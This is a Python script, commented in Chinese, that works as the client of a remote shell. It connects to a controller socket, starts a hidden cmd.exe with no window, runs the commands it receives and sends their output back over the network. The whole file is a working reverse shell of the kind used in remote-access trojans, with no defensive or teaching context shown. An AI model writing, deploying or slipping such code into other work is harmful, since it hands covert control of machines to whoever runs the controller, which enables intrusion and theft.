import socket
import subprocess
import threading

def agent_loop(host="127.0.0.1", port=8888):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    buf = bytearray()
    shell_proc: subprocess.Popen | None = None

    def read_stdout_stderr(proc: subprocess.Popen):
        """后台线程持续读取cmd输出，回传给主控"""
        while proc.poll() is None:
            try:
                chunk = proc.stdout.read(512)
                if not chunk:
                    break
                text = chunk.decode("utf‑8", errors="replace")
                send_line = f"CMD_DATA|{text}\n".encode("utf‑8")
                sock.sendall(send_line)
            except Exception:
                break
        # cmd进程结束通知主控
        sock.sendall(b"CMD_EXIT\n")

    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf.extend(chunk)
        while b'\n' in buf:
            line, buf = buf.split(b'\n',1)
            line = line.strip()
            if not line:
                continue
            if line == b"CMD_SESSION_START":
                # 启动常驻cmd.exe，不弹出窗口
                if shell_proc is not None:
                    continue
                shell_proc = subprocess.Popen(
                    ["cmd.exe"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
                threading.Thread(target=read_stdout_stderr, args=(shell_proc,), daemon=True).start()
            elif line == b"CMD_SESSION_CLOSE":
                # 主控关闭对话框 → 杀死cmd进程
                if shell_proc is not None:
                    try:
                        shell_proc.terminate()
                    except Exception:
                        pass
                    shell_proc = None
            elif line.startswith(b"CMD_WRITE|"):
                if shell_proc is None or shell_proc.poll() is not None:
                    continue
                cmd_payload = line[len(b"CMD_WRITE|"):]
                # 写入命令 + 换行，模拟回车
                write_bytes = cmd_payload + b"\r\n"
                try:
                    shell_proc.stdin.write(write_bytes)
                    shell_proc.stdin.flush()
                except Exception:
                    pass
    if shell_proc:
        try:
            shell_proc.terminate()
        except Exception:
            pass
    sock.close()

if __name__ == "__main__":
    agent_loop(host="127.0.0.1", port=8888)
